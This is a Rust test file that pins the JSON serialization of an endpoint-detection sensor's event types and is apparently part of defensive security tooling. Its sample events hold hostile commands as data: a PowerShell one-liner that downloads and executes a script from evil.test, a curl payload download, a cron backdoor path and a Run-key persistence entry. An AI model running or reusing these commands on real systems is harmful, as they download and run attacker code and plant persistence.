//! Golden-fixture tests: the serialized form of every event type is pinned by the
//! files under `tests/fixtures/v1/`. A failure here means a serialization-visible
//! schema change — that is a `SCHEMA_VERSION` bump and a new fixture directory, never
//! an edit to these files (see crate docs).

use std::net::IpAddr;

use schema::{
    AssemblyLoadEvent, ConnectEvent, DnsQueryEvent, Event, EventMeta, ExecEvent, FileOpenEvent,
    ImageLoadEvent, RegistrySetEvent, ScriptBlockEvent, SmbConnectEvent, UdpSendEvent, User,
    WmiActivityEvent,
    detection::{Detection, DetectionSource, ScoreAttribution, Severity},
};

fn fixture(name: &str) -> serde_json::Value {
    let path = format!(
        "{}/tests/fixtures/v{}/{name}.json",
        env!("CARGO_MANIFEST_DIR"),
        schema::SCHEMA_VERSION,
    );
    serde_json::from_str(&std::fs::read_to_string(&path).expect(&path)).expect(&path)
}

/// Serialize `event`, compare against the fixture, and check the round trip.
fn assert_golden(event: &Event, name: &str) {
    let serialized = serde_json::to_value(event).unwrap();
    assert_eq!(serialized, fixture(name), "fixture mismatch: {name}");
    let back: Event = serde_json::from_value(serialized).unwrap();
    assert_eq!(&back, event, "round trip mismatch: {name}");
}

#[test]
fn exec_unix_golden() {
    assert_golden(
        &Event::Exec(ExecEvent {
            meta: EventMeta {
                pid: 4242,
                ppid: 1337,
                user: User::Unix {
                    uid: 1000,
                    gid: 1000,
                },
                timestamp_ns: 1_756_900_000_123_456_789,
                comm: "bash".into(),
                container: None,
            },
            image_path: "/usr/bin/curl".into(),
            cmdline: "curl -fsSL https://example.test/payload.sh -o /tmp/payload.sh".into(),
            argv: [
                "curl",
                "-fsSL",
                "https://example.test/payload.sh",
                "-o",
                "/tmp/payload.sh",
            ]
            .map(String::from)
            .into(),
            parent_comm: None,
            parent_image_path: None,
            sha256: None,
            signature: None,
        }),
        "exec",
    );
}

#[test]
fn exec_windows_golden() {
    assert_golden(
        &Event::Exec(ExecEvent {
            meta: EventMeta {
                pid: 5120,
                ppid: 620,
                user: User::Windows {
                    sid: "S-1-5-21-1004336348-1177238915-682003330-512".into(),
                    integrity_level: Some(0x3000),
                },
                timestamp_ns: 1_756_900_001_000_000_000,
                comm: "powershell.exe".into(),
            container: None,
            },
            image_path: r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe".into(),
            cmdline: "powershell.exe -NoProfile -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA".into(),
            argv: vec![],
            parent_comm: None,
            parent_image_path: None,
            sha256: None,
            signature: None,
        }),
        "exec_windows",
    );
}

#[test]
fn exec_lineage_golden() {
    // Parent lineage captured at exec time (Word spawning cmd — the classic
    // parent→child transition that lineage features exist to make expensive to fake).
    assert_golden(
        &Event::Exec(ExecEvent {
            meta: EventMeta {
                pid: 6100,
                ppid: 4988,
                user: User::Windows {
                    sid: "S-1-5-21-1004336348-1177238915-682003330-1001".into(),
                    integrity_level: Some(0x2000),
                },
                timestamp_ns: 1_756_900_004_000_000_000,
                comm: "cmd.exe".into(),
                container: None,
            },
            image_path: r"C:\Windows\System32\cmd.exe".into(),
            cmdline: "cmd.exe /c whoami".into(),
            argv: vec![],
            parent_comm: Some("winword.exe".into()),
            parent_image_path: Some(
                r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE".into(),
            ),
            sha256: None,
            signature: None,
        }),
        "exec_lineage",
    );
}

#[test]
fn detection_ml_golden() {
    // An ML detection is never a bare score: registry identity + attributions travel
    // with it (docs/detection/ml.md, "Explanations at detection time").
    let detection = Detection {
        timestamp_ns: 1_756_900_005_000_000_000,
        severity: Severity::High,
        title: "T0 cmdline anomaly".into(),
        source: DetectionSource::Ml {
            tier: 0,
            model_id: "t0-cmdline-linux".into(),
            model_version: "2026.09.0".into(),
        },
        score: Some(0.91),
        attributions: vec![
            ScoreAttribution {
                feature: "entropy".into(),
                value: 5.83,
                contribution: 0.41,
            },
            ScoreAttribution {
                feature: "max_token_length".into(),
                value: 812.0,
                contribution: 0.27,
            },
        ],
        events: vec![Event::Exec(ExecEvent {
            meta: EventMeta {
                pid: 4242,
                ppid: 1337,
                user: User::Unix {
                    uid: 1000,
                    gid: 1000,
                },
                timestamp_ns: 1_756_900_004_123_456_789,
                comm: "bash".into(),
                container: None,
            },
            image_path: "/usr/bin/python3".into(),
            cmdline: "python3 -c print(1)".into(),
            argv: ["python3", "-c", "print(1)"].map(String::from).into(),
            parent_comm: Some("bash".into()),
            parent_image_path: None,
            sha256: None,
            signature: None,
        })],
    };
    let serialized = serde_json::to_value(&detection).unwrap();
    assert_eq!(serialized, fixture("detection_ml"), "fixture mismatch");
    let back: Detection = serde_json::from_value(serialized).unwrap();
    assert_eq!(back, detection, "round trip mismatch");
}

#[test]
fn file_open_golden() {
    assert_golden(
        &Event::FileOpen(FileOpenEvent {
            meta: EventMeta {
                pid: 4242,
                ppid: 1337,
                user: User::Unix { uid: 0, gid: 0 },
                timestamp_ns: 1_756_900_002_000_000_000,
                comm: "cron".into(),
                container: None,
            },
            path: "/etc/cron.d/backdoor".into(),
            flags: 0o1101, // O_WRONLY | O_CREAT | O_TRUNC
        }),
        "file_open",
    );
}

#[test]
fn dns_query_golden() {
    assert_golden(
        &Event::DnsQuery(DnsQueryEvent {
            meta: EventMeta {
                pid: 4242,
                ppid: 1337,
                user: User::Unknown,
                timestamp_ns: 1_756_900_010_000_000_000,
                comm: "chrome-update.exe".into(),
                container: None,
            },
            query: "beacon.example.test".into(),
            qtype: 1,
            result: Some("type:1 172.67.143.127;".into()),
            status: 0,
        }),
        "dns_query",
    );
}

#[test]
fn wmi_activity_golden() {
    // EID 24 — method invocation (Win32_Process.Create → T1047 process spawn via WMI).
    assert_golden(
        &Event::WmiActivity(WmiActivityEvent {
            meta: EventMeta {
                pid: 4242,
                ppid: 1337,
                user: User::Windows {
                    sid: "S-1-5-18".into(),
                    integrity_level: Some(0x4000),
                },
                timestamp_ns: 1_756_900_050_000_000_000,
                comm: "wmic.exe".into(),
                container: None,
            },
            namespace: r"ROOT\CIMv2".into(),
            query: None,
            method: Some("Win32_Process.Create".into()),
        }),
        "wmi_activity",
    );
}

#[test]
fn script_block_golden() {
    assert_golden(
        &Event::ScriptBlock(ScriptBlockEvent {
            meta: EventMeta {
                pid: 5120,
                ppid: 620,
                user: User::Windows {
                    sid: "S-1-5-21-1004336348-1177238915-682003330-512".into(),
                    integrity_level: Some(0x3000),
                },
                timestamp_ns: 1_756_900_040_000_000_000,
                comm: "powershell.exe".into(),
                container: None,
            },
            script_block_id: "a1b2c3d4-e5f6-7890-abcd-ef1234567890".into(),
            path: None,
            text: "IEX (New-Object Net.WebClient).DownloadString('http://evil.test/payload.ps1')"
                .into(),
            message_number: 1,
            message_total: 1,
        }),
        "script_block",
    );
}

#[test]
fn image_load_golden() {
    assert_golden(
        &Event::ImageLoad(ImageLoadEvent {
            meta: EventMeta {
                pid: 4242,
                ppid: 1337,
                user: User::Windows {
                    sid: "S-1-5-18".into(),
                    integrity_level: Some(0x4000),
                },
                timestamp_ns: 1_756_900_030_000_000_000,
                comm: "powershell.exe".into(),
                container: None,
            },
            image_path: r"C:\Windows\System32\amsi.dll".into(),
        }),
        "image_load",
    );
}

#[test]
fn registry_set_golden() {
    assert_golden(
        &Event::RegistrySet(RegistrySetEvent {
            meta: EventMeta {
                pid: 4242,
                ppid: 1337,
                user: User::Windows {
                    sid: "S-1-5-18".into(),
                    integrity_level: Some(0x4000),
                },
                timestamp_ns: 1_756_900_020_000_000_000,
                comm: "chrome-update.exe".into(),
                container: None,
            },
            key: r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run".into(),
            value_name: "ChromeUpdate".into(),
            data_type: 1,
            data: Some(r"C:\Users\Public\chrome-update.exe".into()),
        }),
        "registry_set",
    );
}

#[test]
fn assembly_load_golden() {
    // In-memory .NET assembly — execute-assembly / fileless injection signal.
    // flags = 0x2 (dynamic): the only kind the sensor forwards; file-backed loads
    // are dropped at the provider to avoid high-volume noise.
    assert_golden(
        &Event::AssemblyLoad(AssemblyLoadEvent {
            meta: EventMeta {
                pid: 4242,
                ppid: 1337,
                user: User::Windows {
                    sid: "S-1-5-21-1004336348-1177238915-682003330-512".into(),
                    integrity_level: Some(0x2000),
                },
                timestamp_ns: 1_756_900_060_000_000_000,
                comm: "powershell.exe".into(),
                container: None,
            },
            assembly_name: "MyPayload, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null"
                .into(),
            flags: 2,
        }),
        "assembly_load",
    );
}

#[test]
fn smb_connect_golden() {
    // PsExec-style lateral movement: the SMB client connects to a remote admin share.
    assert_golden(
        &Event::SmbConnect(SmbConnectEvent {
            meta: EventMeta {
                pid: 4242,
                ppid: 1337,
                user: User::Windows {
                    sid: "S-1-5-21-1004336348-1177238915-682003330-512".into(),
                    integrity_level: Some(0x2000),
                },
                timestamp_ns: 1_756_900_070_000_000_000,
                comm: "psexec.exe".into(),
                container: None,
            },
            server_name: r"\\WIN-TARGET".into(),
        }),
        "smb_connect",
    );
}

#[test]
fn udp_send_golden() {
    // dnscat.exe tunneling DNS queries over UDP — large size (120 B) + port 53.
    // Primary signal for DNS-over-UDP C2 and data exfiltration (T1071.004).
    assert_golden(
        &Event::UdpSend(UdpSendEvent {
            meta: EventMeta {
                pid: 4242,
                ppid: 1337,
                user: User::Windows {
                    sid: "S-1-5-21-1004336348-1177238915-682003330-512".into(),
                    integrity_level: Some(0x2000),
                },
                timestamp_ns: 1_756_900_080_000_000_000,
                comm: "dnscat.exe".into(),
                container: None,
            },
            daddr: "8.8.8.8".parse::<IpAddr>().unwrap(),
            dport: 53,
            size: 120,
        }),
        "udp_send",
    );
}

#[test]
fn connect_v6_golden() {
    assert_golden(
        &Event::Connect(ConnectEvent {
            meta: EventMeta {
                pid: 4242,
                ppid: 1337,
                user: User::Unknown,
                timestamp_ns: 1_756_900_003_000_000_000,
                comm: "beacon".into(),
                container: None,
            },
            daddr: "2001:db8::1337".parse::<IpAddr>().unwrap(),
            dport: 8443,
        }),
        "connect",
    );
}

#[test]
fn exec_enriched_golden() {
    assert_golden(
        &Event::Exec(ExecEvent {
            meta: EventMeta {
                pid: 6001,
                ppid: 700,
                user: User::Unix { uid: 0, gid: 0 },
                timestamp_ns: 1_756_900_005_000_000_000,
                comm: "payload".into(),
                container: None,
            },
            image_path: "/tmp/payload".into(),
            cmdline: "/tmp/payload".into(),
            argv: vec!["/tmp/payload".into()],
            parent_comm: None,
            parent_image_path: None,
            sha256: Some("ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad".into()),
            signature: Some(schema::Signature::Unsigned),
        }),
        "exec_enriched",
    );
}

#[test]
fn exec_container_golden() {
    // Attribution-only for now (issue #80): `id` from the cgroup path, `image`/`name`
    // await the Docker/containerd socket lookup (follow-up PR).
    assert_golden(
        &Event::Exec(ExecEvent {
            meta: EventMeta {
                pid: 8842,
                ppid: 1,
                user: User::Unix { uid: 0, gid: 0 },
                timestamp_ns: 1_756_900_006_000_000_000,
                comm: "nginx".into(),
                container: Some(schema::ContainerContext {
                    id: "a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123456".into(),
                    image: None,
                    name: None,
                }),
            },
            image_path: "/usr/sbin/nginx".into(),
            cmdline: "nginx -g daemon off;".into(),
            argv: ["nginx", "-g", "daemon off;"].map(String::from).into(),
            parent_comm: None,
            parent_image_path: None,
            sha256: None,
            signature: None,
        }),
        "exec_container",
    );
}

#[test]
fn unbounded_cmdline_survives() {
    // Audit F-4: multi-kilobyte encoded command lines must round-trip untouched.
    let long = format!("powershell.exe -EncodedCommand {}", "A".repeat(8 * 1024));
    let event = Event::Exec(ExecEvent {
        meta: EventMeta {
            pid: 1,
            ppid: 0,
            user: User::Unknown,
            timestamp_ns: 0,
            comm: "powershell.exe".into(),
            container: None,
        },
        image_path: r"C:\long\path\that\exceeds\the\old\256\byte\limit".repeat(8),
        cmdline: long.clone(),
        argv: vec![],
        parent_comm: None,
        parent_image_path: None,
        sha256: None,
        signature: None,
    });
    let back: Event = serde_json::from_str(&serde_json::to_string(&event).unwrap()).unwrap();
    match &back {
        Event::Exec(e) => assert_eq!(e.cmdline, long),
        other => panic!("wrong variant: {other:?}"),
    }
}

#[test]
fn ml_cmdline_is_the_canonical_nul_joined_form() {
    // Parity contract with `synthaea_ml.data.canonical.cmdline_str`: the ML cmdline
    // scorer's input is argv joined+terminated by NUL, NOT the sensor's display
    // `cmdline` string (which the Linux userspace sensor space-joins — feeding that
    // to the extractor collapses token_count to 1).
    let mk = |cmdline: &str, argv: &[&str]| ExecEvent {
        meta: EventMeta {
            pid: 1,
            ppid: 0,
            user: User::Unknown,
            timestamp_ns: 0,
            comm: "x".into(),
            container: None,
        },
        image_path: String::new(),
        cmdline: cmdline.into(),
        argv: argv.iter().map(|s| (*s).to_string()).collect(),
        parent_comm: None,
        parent_image_path: None,
        sha256: None,
        signature: None,
    };

    // Linux execve: argv present → NUL-joined, ignoring the space-joined `cmdline`.
    assert_eq!(
        mk(
            "curl -fsSL https://x.test",
            &["curl", "-fsSL", "https://x.test"]
        )
        .ml_cmdline(),
        "curl\0-fsSL\0https://x.test\0",
    );
    // Single token still gets its terminator.
    assert_eq!(
        mk("/tmp/payload", &["/tmp/payload"]).ml_cmdline(),
        "/tmp/payload\0"
    );
    // Windows/ETW: no argv → the flat cmdline verbatim, as one token.
    assert_eq!(
        mk("powershell.exe -EncodedCommand ZWNobw==", &[]).ml_cmdline(),
        "powershell.exe -EncodedCommand ZWNobw==",
    );
    // A token containing spaces (e.g. `sh -c "a b"`) is preserved whole.
    assert_eq!(
        mk("", &["sh", "-c", "chmod +x x"]).ml_cmdline(),
        "sh\0-c\0chmod +x x\0",
    );
}

#[test]
fn meta_accessor_covers_all_variants() {
    let meta = EventMeta {
        pid: 7,
        ppid: 1,
        user: User::Unix { uid: 1, gid: 1 },
        timestamp_ns: 42,
        comm: "x".into(),
        container: None,
    };
    let events = [
        Event::Exec(ExecEvent {
            meta: meta.clone(),
            image_path: String::new(),
            cmdline: String::new(),
            argv: vec![],
            parent_comm: None,
            parent_image_path: None,
            sha256: None,
            signature: None,
        }),
        Event::FileOpen(FileOpenEvent {
            meta: meta.clone(),
            path: String::new(),
            flags: 0,
        }),
        Event::Connect(ConnectEvent {
            meta: meta.clone(),
            daddr: "10.0.0.1".parse::<IpAddr>().unwrap(),
            dport: 80,
        }),
        Event::DnsQuery(DnsQueryEvent {
            meta: meta.clone(),
            query: String::new(),
            qtype: 1,
            result: None,
            status: 0,
        }),
        Event::RegistrySet(RegistrySetEvent {
            meta: meta.clone(),
            key: String::new(),
            value_name: String::new(),
            data_type: 1,
            data: None,
        }),
        Event::ImageLoad(ImageLoadEvent {
            meta: meta.clone(),
            image_path: String::new(),
        }),
        Event::ScriptBlock(ScriptBlockEvent {
            meta: meta.clone(),
            script_block_id: String::new(),
            path: None,
            text: String::new(),
            message_number: 1,
            message_total: 1,
        }),
        Event::WmiActivity(WmiActivityEvent {
            meta: meta.clone(),
            namespace: String::new(),
            query: None,
            method: None,
        }),
        Event::AssemblyLoad(AssemblyLoadEvent {
            meta: meta.clone(),
            assembly_name: String::new(),
            flags: 2,
        }),
        Event::SmbConnect(SmbConnectEvent {
            meta: meta.clone(),
            server_name: String::new(),
        }),
        Event::UdpSend(UdpSendEvent {
            meta: meta.clone(),
            daddr: "10.0.0.1".parse::<IpAddr>().unwrap(),
            dport: 53,
            size: 0,
        }),
    ];
    for e in &events {
        assert_eq!(e.meta().pid, 7);
    }
}
